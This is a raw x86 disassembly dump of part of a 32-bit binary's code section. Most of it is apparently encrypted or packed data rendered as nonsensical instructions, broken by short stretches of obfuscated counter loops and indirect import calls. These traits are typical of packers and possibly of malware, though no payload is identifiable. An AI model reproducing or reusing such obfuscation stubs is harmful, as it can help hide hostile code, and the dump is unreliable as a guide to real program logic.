  4020e2:	lods   eax,DWORD PTR ds:[esi]
  4020e3:	jno    0x402138
  4020e5:	shr    DWORD PTR [edx],0x59
  4020e8:	cwde   
  4020e9:	dec    edx
  4020ea:	mov    eax,0xf51900c7
  4020ef:	pop    esp
  4020f0:	adc    eax,0x50d9f31f
  4020f5:	ret    
  4020f6:	retf   0xb1a3
  4020f9:	inc    esi
  4020fa:	push   ds
  4020fb:	(bad)  
  4020fc:	jne    0x402132
  4020fe:	or     DWORD PTR [esi],esp
  402100:	enter  0xee19,0xd7
  402104:	test   al,0x44
  402106:	pop    eax
  402107:	inc    edx
  402108:	mov    dl,0xf
  40210a:	(bad)  
  40210c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40210d:	jg     0x402177
  40210f:	fisub  WORD PTR [ebp-0x630f0761]
  402115:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402116:	adc    bh,BYTE PTR [ebp-0x1a]
  402119:	push   0xfffffff6
  40211b:	stc    
  40211c:	pop    esi
  40211d:	and    ebp,DWORD PTR [ebp-0x1c]
  402120:	xor    DWORD PTR ds:0xf0008c24,esi
  402126:	sbb    al,0x97
  402128:	cmp    al,0x91
  40212a:	inc    esi
  40212b:	dec    eax
  40212c:	jmp    0xeb3c3db3
  402131:	(bad)  
  402132:	mov    bl,0xce
  402134:	clc    
  402135:	jno    0x402127
  402137:	mov    gs,edx
  402139:	adc    eax,0x29f37200
  40213e:	mov    al,ds:0xc7ba14b3
  402143:	mov    ecx,0x8918c10a
  402148:	rol    ebp,0xca
  40214b:	setnp  al
  40214e:	and    bh,BYTE PTR [ebx+0x27c67ee9]
  402154:	retf   
  402155:	aaa    
  402156:	and    eax,0x5f1fe8e9
  40215b:	or     eax,0x25cbe4df
  402160:	sbb    eax,0xc4047757
  402165:	aas    
  402166:	mov    edx,cs
  402168:	mov    dh,0xac
  40216a:	push   esp
  40216b:	leave  
  40216c:	popa   
  40216d:	xchg   ecx,eax
  40216e:	fnstsw WORD PTR [esi]
  402170:	mov    es,edx
  402172:	popa   
  402173:	mov    ah,0x86
  402175:	dec    ebp
  402176:	xchg   esp,eax
  402177:	jg     0x4021d9
  402179:	sbb    al,0x70
  40217b:	jne    0x402159
  40217d:	cmp    ch,BYTE PTR [esi+edi*1+0x1304ffea]
  402184:	mov    dh,0xad
  402186:	sbb    eax,0x7992a519
  40218b:	push   edx
  40218c:	or     dh,ah
  40218e:	out    dx,eax
  40218f:	and    bh,al
  402191:	outs   dx,DWORD PTR ds:[esi]
  402192:	adc    dl,BYTE PTR ds:0x333d3e29
  402198:	push   esp
  402199:	lahf   
  40219a:	aad    0xbf
  40219c:	jmp    0xb9b87451
  4021a1:	and    cl,BYTE PTR [ebp-0x48]
  4021a4:	inc    eax
  4021a5:	dec    esp
  4021a6:	(bad)  
  4021a7:	arpl   di,dx
  4021a9:	jmp    0x699ad701
  4021ae:	cmp    ah,BYTE PTR [esp+edx*2]
  4021b1:	lea    edx,[esi-0x3d1e14a5]
  4021b7:	jmp    DWORD PTR [edx]
  4021ba:	add    al,0xfd
  4021bc:	lods   al,BYTE PTR ds:[esi]
  4021bd:	inc    ebp
  4021be:	mov    WORD PTR [eax+0xf3c7911],fs
  4021c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021c6:	retf   0x4039
  4021c9:	std    
  4021ca:	pop    ecx
  4021cb:	popf   
  4021cc:	sub    eax,0xe6f65533
  4021d1:	nop
  4021d2:	adc    DWORD PTR [esi],0xffffffe5
  4021d5:	lods   al,BYTE PTR ds:[esi]
  4021d6:	push   eax
  4021d7:	pop    ecx
  4021d8:	loopne 0x4021b0
  4021da:	retf   
  4021db:	mov    edi,0xfdfed715
  4021e0:	jb     0x402225
  4021e2:	jmp    0x4021fc
  4021e4:	shl    esp,0x38
  4021e7:	jp     0x40225d
  4021e9:	sbb    al,0x1b
  4021eb:	inc    esi
  4021ec:	test   DWORD PTR ds:0x15617a06,eax
  4021f2:	stc    
  4021f3:	dec    esp
  4021f4:	(bad)  
  4021f5:	daa    
  4021f6:	jge    0x40222a
  4021f8:	leave  
  4021f9:	loope  0x402213
  4021fb:	loopne 0x4021e0
  4021fd:	push   es
  4021fe:	or     DWORD PTR [ecx-0x2f],esp
  402201:	sbb    eax,0x41b0b791
  402206:	dec    ebp
  402207:	cmp    eax,0x94c13dcc
  40220c:	int3   
  40220d:	or     al,0xd5
  40220f:	push   edi
  402210:	pop    esp
  402211:	(bad)  
  402212:	mov    edi,0x95ad7acb
  402217:	sub    ch,ch
  402219:	imul   bp,bx,0x22
  40221d:	xchg   esi,eax
  40221e:	xchg   esp,eax
  40221f:	dec    edi
  402220:	pop    ebx
  402221:	(bad)  
  402222:	jge    0x402267
  402224:	inc    eax
  402225:	pop    ds
  402226:	or     BYTE PTR ds:0xf00839b6,cl
  40222c:	inc    ecx
  40222d:	sbb    DWORD PTR [esi],ecx
  40222f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402230:	retf   
  402231:	jge    0x402204
  402233:	adc    DWORD PTR [edx-0x2629c960],ebp
  402239:	xor    edi,esi
  40223b:	mov    ebp,0x12f81eed
  402240:	jg     0x4021ca
  402242:	test   BYTE PTR [ecx-0x287dface],0x90
  402249:	or     eax,0x4c731117
  40224e:	mov    dh,0x56
  402250:	adc    ecx,esi
  402252:	sbb    dh,ch
  402254:	ret    0x59ac
  402257:	test   al,0x9
  402259:	jbe    0x402247
  40225b:	mov    dl,0x8
  40225d:	jns    0x4021fd
  40225f:	hlt    
  402260:	lds    edx,FWORD PTR [ebx]
  402262:	std    
  402263:	and    ecx,ebp
  402265:	or     eax,0xc25bbf40
  40226a:	enter  0xd244,0x34
  40226e:	dec    ecx
  40226f:	repz and cl,BYTE PTR [esi]
  402272:	aas    
  402273:	shld   DWORD PTR [ebx-0x40360fd9],edi,0x83
  40227b:	and    esp,eax
  40227d:	jg     0x4022d5
  40227f:	enter  0xf6a4,0x26
  402283:	xor    edi,DWORD PTR [edx+0x78]
  402286:	adc    eax,edx
  402288:	mov    ch,0x9e
  40228a:	adc    ecx,ebp
  40228c:	in     eax,0x3
  40228e:	jnp    0x402288
  402290:	mov    al,0x29
  402292:	std    
  402293:	hlt    
  402294:	xchg   ecx,eax
  402295:	jl     0x402276
  402297:	dec    ecx
  402298:	mov    bl,0x2d
  40229a:	lods   al,BYTE PTR ds:[esi]
  40229b:	out    dx,eax
  40229c:	cli    
  40229d:	pop    esp
  40229e:	xor    eax,0x22b2a387
  4022a3:	pop    esi
  4022a4:	and    eax,DWORD PTR [ebx+0x40]
  4022a7:	push   cs
  4022a8:	js     0x4022f0
  4022aa:	icebp  
  4022ab:	pop    ebx
  4022ac:	js     0x4022e7
  4022ae:	and    esi,ecx
  4022b0:	sbb    eax,0x1c500b4f
  4022b5:	cwde   
  4022b6:	mov    ds:0x55ca8e02,eax
  4022bb:	je     0x4022c6
  4022bd:	adc    al,BYTE PTR [edx+0x7a]
  4022c0:	(bad)  
  4022c1:	adc    al,0x11
  4022c3:	add    bl,BYTE PTR [ebx-0x2fefe775]
  4022c9:	inc    esi
  4022ca:	mov    ah,0x48
  4022cc:	xor    eax,0x7bf8bea6
  4022d1:	lds    edi,FWORD PTR [ebx+0x7c]
  4022d4:	cmp    dl,bh
  4022d6:	jo     0x4022ef
  4022d8:	stc    
  4022d9:	scas   eax,DWORD PTR es:[edi]
  4022da:	pop    ecx
  4022db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022dc:	pop    eax
  4022dd:	clc    
  4022de:	push   es
  4022df:	scas   al,BYTE PTR es:[edi]
  4022e0:	xchg   ebp,ecx
  4022e2:	jnp    0x4022b7
  4022e4:	xor    eax,0x81038a45
  4022e9:	xor    al,0x20
  4022eb:	out    0xc7,eax
  4022ed:	mov    edi,0xf5c4c6f0
  4022f2:	retf   
  4022f3:	idiv   BYTE PTR [ebx+0x57245889]
  4022f9:	add    ecx,DWORD PTR [esi+0x1a5650dc]
  4022ff:	jg     0x402316
  402301:	cmovl  ebx,DWORD PTR [esi+0x32eefc68]
  402308:	mov    edi,0xb88897e5
  40230d:	dec    eax
  40230e:	or     al,0x7b
  402310:	test   ch,bl
  402312:	(bad)  
  402313:	fld    TBYTE PTR [edi]
  402315:	scas   eax,DWORD PTR es:[edi]
  402316:	mov    ds:0x133528ae,eax
  40231b:	dec    esp
  40231c:	fprem1 
  40231e:	pop    esp
  40231f:	fnstsw WORD PTR [esi+edi*1]
  402322:	sbb    esi,DWORD PTR [edi-0x1f9af06b]
  402328:	mov    dl,0xb8
  40232a:	dec    ebx
  40232b:	sub    esp,DWORD PTR [ebp+0x33d70bf3]
  402331:	xchg   DWORD PTR ds:0x42618478,edx
  402337:	inc    ebx
  402338:	pop    edx
  402339:	sbb    esi,eax
  40233b:	retf   0x4dbd
  40233e:	int    0xdc
  402340:	ret    0x2868
  402343:	xchg   BYTE PTR [ebp-0x6c],al
  402346:	lods   eax,DWORD PTR ds:[esi]
  402347:	sub    eax,0xdfdc18e1
  40234c:	xlat   BYTE PTR ds:[ebx]
  40234d:	jmp    0x766f:0x5f7ea3fd
  402354:	cmp    ah,ah
  402356:	jmp    0x402371
  402358:	pusha  
  402359:	lea    eax,[ebp-0x98]
  40235f:	inc    ebx
  402360:	mov    DWORD PTR [ebp-0x8],eax
  402363:	mov    eax,DWORD PTR [ebp-0x10]
  402366:	xor    DWORD PTR ds:0x433717,ecx
  40236c:	mov    DWORD PTR [ebp-0x24],eax
  40236f:	not    ebx
  402371:	mov    eax,DWORD PTR [ebp-0x1c]
  402374:	or     ebx,DWORD PTR ds:0x4337fb
  40237a:	mov    DWORD PTR [ebp-0x20],eax
  40237d:	and    eax,ebx
  40237f:	mov    ebx,0xf89c853d
  402384:	mov    DWORD PTR [ebp-0x50],ebx
  402387:	mov    eax,DWORD PTR [ebp-0x50]
  40238a:	and    DWORD PTR ds:0x43377b,0x0
  402394:	jmp    0x4023a6
  402399:	mov    ecx,DWORD PTR ds:0x43377b
  40239f:	inc    ecx
  4023a0:	mov    DWORD PTR ds:0x43377b,ecx
  4023a6:	cmp    DWORD PTR ds:0x43377b,0x11
  4023ad:	jae    0x4023dd
  4023b3:	cmp    DWORD PTR ds:0x43377b,0x1b
  4023ba:	jne    0x4023cb
  4023c0:	push   0x4337bf
  4023c5:	call   DWORD PTR ds:0x4121bc
  4023cb:	jmp    0x402399
  4023d0:	movzx  ecx,WORD PTR ds:0x4337f7
  4023d7:	or     DWORD PTR ds:0x433767,ecx
  4023dd:	mov    ecx,DWORD PTR [ebp-0x8]
  4023e0:	xor    eax,esi
  4023e2:	add    eax,edi
  4023e4:	or     DWORD PTR ds:0x433777,0x43383f
  4023ee:	mov    DWORD PTR [ecx],eax
  4023f0:	mov    eax,DWORD PTR [ebp-0x24]
  4023f3:	and    DWORD PTR ds:0x43376f,0x0
  4023fd:	mov    ecx,DWORD PTR ds:0x43376f
  402403:	inc    ecx
  402404:	mov    DWORD PTR ds:0x43376f,ecx
  40240a:	cmp    DWORD PTR ds:0x43376f,0x5
  402411:	jne    0x402436
  402417:	push   DWORD PTR [ebp-0x14]
  40241a:	push   DWORD PTR [ebp-0x18]
  40241d:	push   DWORD PTR [ebp-0x24]
  402420:	push   DWORD PTR [ebp-0x20]
  402423:	push   0x40e6
  402428:	push   0x433910
  40242d:	push   DWORD PTR [ebp-0x10]
  402430:	call   DWORD PTR ds:0x412354
  402436:	cmp    DWORD PTR ds:0x43376f,0x4
  40243d:	jne    0x402450
  402443:	mov    ecx,DWORD PTR ds:0x43376f
  402449:	inc    ecx
  40244a:	mov    DWORD PTR ds:0x43376f,ecx
  402450:	cmp    DWORD PTR ds:0x43376f,0x1d
  402457:	jb     0x4023fd
  40245d:	mov    ecx,DWORD PTR [ebp-0x8]
  402460:	xor    eax,esi
  402462:	add    eax,edi
  402464:	mov    DWORD PTR [ecx+0x4],eax
  402467:	mov    eax,DWORD PTR [ebp-0x2c]
  40246a:	mov    ecx,DWORD PTR [ebp-0x8]
  40246d:	jmp    0x40287b
  402472:	ror    BYTE PTR [ecx-0x3a],cl
  402475:	dec    esi
  402476:	inc    ebp
  402477:	push   ecx
  402478:	push   edx
  402479:	push   ecx
  40247a:	sbb    esp,DWORD PTR [edx-0x1e435390]
  402480:	jge    0x4024d0
  402482:	mov    edx,0x6f7e7e01
  402487:	jge    0x402507
  402489:	jle    0x4024d3
  40248b:	push   0x226fbdb8
  402490:	pop    ds
  402491:	cmp    ebp,eax
  402493:	sbb    esp,DWORD PTR [ecx]
  402495:	mov    al,0x9b
  402497:	iret   
  402498:	cmp    eax,0x196c44a0
  40249d:	inc    edx
  40249e:	cmc    
  40249f:	cmp    eax,0x5a8abdb9
  4024a4:	sub    BYTE PTR [ebp+eax*4-0x11f0b4a3],0x7
  4024ac:	add    edi,edi
  4024ae:	jbe    0x402474
  4024b0:	pop    esi
  4024b1:	jmp    0x8ca1:0xd4c79cf
  4024b8:	les    esp,FWORD PTR [ecx-0x345a7579]
  4024be:	inc    eax
  4024bf:	inc    ebp
  4024c0:	mov    eax,ds:0x2e568628
  4024c5:	retf   
  4024c6:	ja     0x402484
  4024c8:	iret   
  4024c9:	mov    eax,0xf68694db
  4024ce:	ja     0x4024f5
  4024d0:	sbb    bh,0xea
  4024d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024d4:	int    0x2a
  4024d6:	ds (bad) 
  4024d9:	mov    ecx,ebx
  4024db:	repz das 
  4024dd:	xor    ebp,DWORD PTR [esi-0x25]
  4024e0:	cmp    al,0xfe
  4024e2:	mov    al,ds:0x7227f6b3
  4024e7:	cmp    edx,esp
  4024e9:	lock adc al,0xce
  4024ec:	popa   
  4024ed:	push   edx
  4024ee:	xchg   esi,eax
  4024ef:	adc    dh,bh
  4024f1:	pop    es
  4024f2:	or     eax,0x8dae3672
  4024f7:	(bad)  
  4024f8:	das    
  4024f9:	pop    ss
  4024fa:	inc    ecx
  4024fb:	les    edx,FWORD PTR [edi]
  4024fd:	push   edx
  4024fe:	call   0xa7bf2545
  402503:	push   ebx
  402504:	xchg   esp,eax
  402505:	rcl    ah,cl
  402507:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402508:	mov    ah,0x52
  40250a:	lock jo 0x402588
  40250d:	jno    0x40249c
  40250f:	ins    BYTE PTR es:[edi],dx
  402510:	push   esi
  402511:	sbb    BYTE PTR [esi+eiz*8-0x6cd97b1b],0xa3
  402519:	mov    edx,0x4d6ec728
  40251e:	enter  0x5f3a,0x84
  402522:	jg     0x402533
  402524:	outs   dx,BYTE PTR ds:[esi]
  402525:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402526:	xchg   ecx,eax
  402527:	rol    BYTE PTR [eax+0x324cddbf],cl
  40252d:	ins    BYTE PTR es:[edi],dx
  40252e:	xchg   esp,eax
  40252f:	popf   
  402530:	xchg   ebx,eax
  402531:	sbb    DWORD PTR [edi-0x9b4b156],ebp
  402537:	popa   
  402538:	xchg   BYTE PTR [edx+0x31],dh
  40253b:	sbb    esi,DWORD PTR [edi+0x653c6fc1]
  402541:	cmc    
  402542:	dec    esi
  402543:	cmc    
  402544:	mov    ah,0xb7
  402546:	test   al,0xe7
  402548:	and    DWORD PTR [ebx],ebp
  40254a:	mov    al,0x4a
  40254c:	aas    
  40254d:	pushf  
  40254e:	stos   DWORD PTR es:[edi],eax
  40254f:	pushf  
  402550:	rcr    BYTE PTR [ebx-0x5e],0x98
  402554:	call   0x7611:0xba9370a4
  40255b:	fiadd  DWORD PTR [ebp-0x63]
  40255e:	mov    edi,0x4b07e074
  402563:	cmp    esp,DWORD PTR [ebx]
  402565:	(bad)  
  402566:	repz mov bl,0xfd
  402569:	shl    DWORD PTR es:[edi+esi*2+0x74],cl
  40256e:	int3   
  40256f:	pop    ss
  402570:	push   esp
  402571:	or     BYTE PTR [esi],0xd6
  402574:	push   ecx
  402575:	shufps xmm0,XMMWORD PTR [esi],0x14
  402579:	pop    ebx
  40257a:	pop    ds
  40257b:	enter  0x3b6,0x9
  40257f:	push   cs
  402580:	mov    ch,0x2c
  402582:	or     ebp,DWORD PTR [edi]
  402584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402585:	(bad)  
  402586:	sub    DWORD PTR [ebx-0xe5e0fd0],ebp
  40258c:	ret    
  40258d:	or     BYTE PTR [esi],0x85
  402590:	mov    al,BYTE PTR [edx+0x17]
  402593:	mov    dh,BYTE PTR [ebx+eiz*8-0x63]
  402597:	xor    ecx,DWORD PTR [ebp-0x21]
  40259a:	adc    ebx,DWORD PTR [edx-0x64aaae12]
  4025a0:	jbe    0x4025b1
  4025a2:	out    dx,al
  4025a3:	repnz pop eax
  4025a5:	xor    eax,0x3fb36b9b
  4025aa:	jb     0x40253b
  4025ac:	mov    ecx,0x96492ffc
  4025b1:	dec    esi
  4025b2:	adc    esp,esp
  4025b4:	outs   dx,BYTE PTR ds:[esi]
  4025b5:	mov    ah,0x84
  4025b7:	stos   BYTE PTR es:[edi],al
  4025b8:	not    DWORD PTR [esi-0xa]
  4025bb:	stos   BYTE PTR es:[edi],al
  4025bc:	(bad)  
  4025bd:	push   eax
  4025be:	sub    al,BYTE PTR [ebx]
  4025c0:	add    DWORD PTR [eax+eax*8+0x3bb3da9],0x57
  4025c8:	call   0x9cb96a8e
  4025cd:	nop
  4025ce:	ss (bad) 
  4025d0:	pusha  
  4025d1:	call   0xea250373
  4025d6:	mov    ecx,0x829d55f5
  4025db:	repz fdivr DWORD PTR [esp+eax*4]
  4025df:	out    dx,al
  4025e0:	lahf   
  4025e1:	pop    edi
  4025e2:	jmp    0x4025b0
  4025e4:	push   ebp
  4025e5:	addr16 (bad) 
  4025e7:	jnp    0x402613
  4025e9:	xlat   BYTE PTR ds:[ebx]
  4025ea:	cmp    eax,0x92bf20cc
  4025ef:	and    al,0xd4
  4025f1:	vorps  ymm4,ymm0,ymm2
  4025f6:	call   0x614f:0xdea985f1
  4025fd:	xor    al,0xec
  4025ff:	mov    ah,0x8a
  402601:	icebp  
  402602:	cmp    eax,0x52dd2f09
  402607:	lea    ebp,[ebp-0x720eb13]
  40260d:	jge    0x402620
  40260f:	imul   esi,DWORD PTR [edi+ebp*2+0x4a],0xe0515ade
  402617:	xlat   BYTE PTR ds:[ebx]
  402618:	pop    eax
  402619:	mov    bl,0x3
  40261b:	push   cs
  40261c:	fwait
  40261d:	leave  
  40261e:	cld    
  40261f:	mov    cl,0x2f
  402621:	push   cs
  402622:	jns    0x402618
  402624:	in     al,dx
  402625:	push   eax
  402626:	(bad)  
  402627:	(bad)  
  402628:	xor    ch,BYTE PTR [ebp-0x143b8451]
  40262e:	ins    BYTE PTR es:[edi],dx
  40262f:	adc    DWORD PTR [ecx+esi*2-0x56c3692e],edi
  402636:	mov    edx,0x9a464b3b
  40263b:	mov    bh,0x8
  40263d:	shl    eax,0xc9
  402640:	xor    al,0x2b
  402642:	sbb    eax,0x1bbb061f
  402647:	outs   dx,DWORD PTR ds:[esi]
  402648:	xor    BYTE PTR [ebp+0x70],ch
  40264b:	jge    0x402603
  40264d:	xor    dh,BYTE PTR [ecx-0xa]
  402650:	push   esp
  402651:	push   ss
  402652:	rol    BYTE PTR [esi+ebp*2-0x4c],1
  402656:	pop    ebx
  402657:	xchg   edi,eax
  402658:	ja     0x4026d7
  40265a:	call   0x15b3:0xe11588b6
  402661:	in     eax,dx
  402662:	mov    ?,WORD PTR [edi-0x67e77198]
  402668:	shr    DWORD PTR [ecx-0x6],0x3c
  40266c:	lods   al,BYTE PTR ds:[esi]
  40266d:	jno    0x4026ee
  40266f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402670:	or     al,0x19
  402672:	shl    al,cl
  402674:	imul   DWORD PTR [ecx]
  402676:	pop    edi
  402677:	call   0xaa1:0x831ab040
  40267e:	mov    esi,0xd7e676aa
  402683:	adc    edx,esp
  402685:	xchg   edi,eax
  402686:	push   esi
  402687:	mov    ch,0x36
  402689:	in     al,dx
  40268a:	jns    0x402627
  40268c:	mov    edi,0x8bf4286
  402691:	fcomi  st,st(0)
  402693:	imul   al
  402695:	or     BYTE PTR [edx-0x4d],dh
  402698:	push   ss
  402699:	sbb    eax,0x984491f5
  40269e:	cmp    eax,0xcfcfe55d
  4026a3:	xor    esi,ebx
  4026a5:	call   DWORD PTR [ebp+0x46]
  4026a8:	test   DWORD PTR [bp+si],edx
  4026ab:	cmp    DWORD PTR [esi],esp
  4026ad:	imul   edx,eax,0xc1d95afb
  4026b3:	mov    edx,0x290171d4
  4026b8:	xchg   cx,ax
  4026ba:	jo     0x402691
  4026bc:	imul   ebx,DWORD PTR [ebp+0x4ded2b57],0xfeb073b3
  4026c6:	(bad)  
  4026c7:	adc    bl,dl
  4026c9:	imul   ecx,esi,0x47
  4026cc:	je     0x2cb41cff
  4026d2:	test   DWORD PTR [ebp+0x2],eax
  4026d5:	mov    ecx,0x3d7868dc
  4026da:	xchg   edx,eax
  4026db:	cmp    bh,BYTE PTR [esi]
  4026dd:	fisttp DWORD PTR [esi+0x17]
  4026e0:	xor    BYTE PTR [ebx],al
  4026e2:	arpl   WORD PTR [edx+0x7c2c53c2],cx
  4026e8:	lods   eax,DWORD PTR ds:[esi]
  4026e9:	add    esi,DWORD PTR [edi-0x58]
  4026ec:	stos   DWORD PTR es:[edi],eax
  4026ed:	(bad)  
  4026ee:	and    al,0xb1
  4026f0:	jecxz  0x402752
  4026f2:	pop    ss
  4026f3:	xchg   edx,eax
  4026f4:	mov    bh,0xb
  4026f6:	out    0x95,eax
  4026f8:	jmp    0x7b3:0x774190e8
  4026ff:	stos   DWORD PTR es:[edi],eax
  402700:	les    ebp,FWORD PTR [edi]
  402702:	or     edx,DWORD PTR [edi-0x751bd572]
  402708:	sub    BYTE PTR [ecx+0x3e3a0730],cl
  40270e:	sbb    BYTE PTR [esi-0x79],al
  402711:	mov    eax,0x8065f027
  402716:	dec    eax
  402717:	pop    es
  402718:	dec    edx
  402719:	inc    ebp
  40271a:	adc    BYTE PTR [edx],dl
  40271c:	fild   DWORD PTR [edi+0x513d0cc3]
  402722:	adc    BYTE PTR [esi+ebp*2+0x5d],bh
  402726:	aad    0x23
  402728:	mov    al,0xcd
  40272a:	imul   ebp,DWORD PTR [edx],0x7e
  40272d:	add    al,0xe4
  40272f:	cdq    
  402730:	sub    al,BYTE PTR [esi]
  402732:	(bad)  
  402733:	pushf  
  402734:	mov    ebp,0x79f732f9
  402739:	adc    BYTE PTR [ecx+edx*1-0x51],cl
  40273d:	pop    ds
  40273e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40273f:	push   0x42
  402741:	int    0xd0
  402743:	call   0x1bf11cb7
  402748:	mov    esi,0x14318dca
  40274d:	out    0xf0,eax
  40274f:	or     BYTE PTR [ecx],ch
  402751:	cmp    BYTE PTR [edx],cl
  402753:	dec    ebx
  402754:	push   eax
  402755:	test   BYTE PTR [ebp+0x76265eea],dl
  40275b:	adc    eax,0x559c2dac
  402760:	scas   eax,DWORD PTR es:[edi]
  402761:	xchg   edi,ebp
  402763:	bound  eax,QWORD PTR [esi]
  402765:	pop    esi
  402766:	jmp    0x4027a8
  402768:	sbb    cl,ch
  40276a:	add    DWORD PTR [eax+ecx*8],0x54
  40276e:	mov    WORD PTR [edi],gs
  402770:	loope  0x40273d
  402772:	std    
  402773:	or     al,0x1d
  402775:	fisub  DWORD PTR [esi]
  402777:	dec    ecx
  402779:	int    0x89
  40277b:	call   0x83bca1c7
  402780:	mov    ch,0xc8
  402782:	out    dx,eax
  402783:	xchg   esi,eax
  402784:	icebp  
  402785:	out    dx,eax
  402786:	or     al,0x3
  402788:	ret    0xbac5
  40278b:	and    cl,BYTE PTR [edi]
  40278d:	lock gs xchg esp,eax
  402790:	lds    edx,FWORD PTR [ebp+eiz*4+0x6310c62b]
  402797:	dec    edx
  402798:	clc    
  402799:	sahf   
  40279a:	into   
  40279b:	imul   esi,DWORD PTR [ecx-0x44b6bbba],0x382da84d
  4027a5:	mov    cl,0xfe
  4027a7:	xchg   ebx,eax
  4027a8:	or     dl,BYTE PTR [esi-0x46656a41]
  4027ae:	mov    al,ds:0x24933aa5
  4027b3:	loope  0x402757
  4027b5:	adc    BYTE PTR [eax],bl
  4027b7:	mov    esp,0x6572bd6d
  4027bc:	dec    ecx
  4027bd:	jns    0x4027a6
  4027bf:	lock add DWORD PTR [edx],esp
  4027c2:	aam    0x1b
  4027c4:	jno    0x402759
  4027c6:	call   0x8251:0x84373b9
  4027cd:	xor    bh,BYTE PTR [edx-0x1ddcbb6e]
  4027d3:	push   ebx
  4027d4:	pusha  
  4027d5:	xor    edi,edx
  4027d7:	mov    al,0x9e
  4027d9:	pop    edx
  4027da:	(bad)  
  4027db:	mov    esi,0x2ec93dac
  4027e0:	push   es
  4027e1:	inc    ebp
  4027e2:	scas   al,BYTE PTR es:[edi]
  4027e3:	inc    edi
  4027e4:	inc    ebp
  4027e5:	mov    ebp,0x4c8883f0
  4027ea:	and    al,0x7f
  4027ec:	mov    BYTE PTR ss:[eax+0x15],ch
  4027f0:	aam    0xe8
  4027f2:	ret    
  4027f3:	mov    esi,0xa390a1f9
  4027f8:	js     0x402879
  4027fa:	enter  0x5bfc,0xea
  4027fe:	mov    cs,WORD PTR [esi+0x78]
  402801:	fisttp QWORD PTR [ebp+0x459e1c0f]
  402807:	mov    WORD PTR [ebx+0x47],fs
  40280a:	pop    ds
  40280b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40280c:	jle    0x402815
  40280e:	call   0xbe41:0x36096dbe
  402815:	test   al,0x2f
  402817:	inc    DWORD PTR [eax-0x5b2d4243]
  40281d:	aas    
  40281e:	mov    dh,0x25
  402820:	dec    edx
  402821:	loope  0x40283a
  402823:	mov    dh,0x1e
  402825:	xor    eax,0x131a17bd
  40282a:	mov    ecx,0x9cc919f4
  40282f:	add    esp,DWORD PTR [eax+ebp*4]
  402832:	out    dx,eax
  402833:	lods   al,BYTE PTR ds:[esi]
  402834:	xchg   ecx,eax
  402835:	pop    esp
  402836:	xchg   al,cl
  402838:	xor    al,0x23
  40283a:	mov    ebx,0x8d90765
  40283f:	das    
  402840:	and    edi,ecx
  402842:	sbb    edx,edi
  402844:	cmc    
  402845:	mov    edi,0xab079091
  40284a:	cdq    
  40284b:	mov    WORD PTR [edi+0x14],fs
  40284e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40284f:	outs   dx,BYTE PTR ds:[esi]
  402850:	inc    ecx
  402851:	ret    
  402852:	add    dh,BYTE PTR [edi]
  402854:	hlt    
  402855:	pusha  
  402856:	test   al,0xa
  402858:	mov    BYTE PTR [ecx+0x1f3b98f8],cl
  40285e:	fldcw  WORD PTR [ebx+0x69]
  402861:	pop    eax
  402862:	inc    ebp
  402863:	adc    esp,DWORD PTR [edi-0x15d6e5c3]
  402869:	(bad)  
  40286a:	xlat   BYTE PTR ds:[ebx]
  40286b:	push   ss
  40286c:	addr16 pop eax
  40286e:	repz cmp DWORD PTR [esi],ebp
  402871:	adc    DWORD PTR ds:0xcc6afa38,ebp
  402877:	shl    DWORD PTR [eax+0x41896be5],1
  40287d:	or     BYTE PTR [ebx+0x4d8bd045],cl
  402883:	clc    
  402884:	mov    DWORD PTR [ecx+0xc],eax
  402887:	mov    eax,DWORD PTR [ebp-0x34]
  40288a:	mov    ecx,DWORD PTR [ebp-0x8]
  40288d:	mov    DWORD PTR [ecx+0x10],eax
  402890:	mov    eax,eax
  402892:	mov    eax,DWORD PTR [ebp-0x20]
  402895:	xor    eax,esi
  402897:	add    eax,edi
  402899:	je     0x402cd8
  40289f:	lea    eax,[ebp-0x98]
  4028a5:	push   eax
  4028a6:	mov    eax,DWORD PTR [ebp-0x1c]
  4028a9:	xor    eax,esi
  4028ab:	add    eax,edi
  4028ad:	push   eax
  4028ae:	mov    eax,DWORD PTR [ebp-0x18]
  4028b1:	jmp    0x402cbf
  4028b6:	xor    eax,DWORD PTR [ebx]
  4028b8:	mov    dl,0xa
  4028ba:	mov    dl,0xab
  4028bc:	mov    bl,0x23
  4028be:	sbb    al,0x86
  4028c0:	adc    al,BYTE PTR [ebx+0x51f8a8ba]
  4028c6:	stos   DWORD PTR es:[edi],eax
  4028c7:	or     eax,0x7d6f7e7e
  4028cc:	jle    0x40294c
  4028ce:	popf   
  4028cf:	in     eax,dx
  4028d0:	xchg   edi,eax
  4028d1:	test   DWORD PTR [edi-0x103c12a3],0xb9115f75
  4028db:	cmp    ch,al
  4028dd:	push   eax
  4028de:	pushf  
  4028df:	(bad)  
  4028e0:	xchg   ebp,eax
  4028e1:	sub    al,0x6c
  4028e3:	pop    ss
  4028e4:	lock in eax,0x28
  4028e7:	cmp    cl,BYTE PTR [eax]
  4028e9:	jo     0x4028e7
  4028eb:	enter  0x8c44,0x44
  4028ef:	jno    0x4028c2
  4028f1:	jge    0x40296e
  4028f3:	dec    ebp
  4028f4:	shr    BYTE PTR [edx+0x44],cl
  4028f7:	arpl   WORD PTR [ebx+0xbbb7b12],bp
  4028fd:	cmp    DWORD PTR [edi],esi
  4028ff:	rol    ah,cl
  402901:	sar    DWORD PTR ss:[ebp+0x72],cl
  402905:	stos   BYTE PTR es:[edi],al
  402906:	lahf   
  402907:	adc    DWORD PTR [edx],edi
  402909:	sub    DWORD PTR [ebp+0x71],edx
  40290c:	dec    edi
  40290d:	data16 jmp 0x4028dd
  402910:	jp     0x4028ca
  402912:	xchg   DWORD PTR [edx-0x6fd7a4f1],ecx
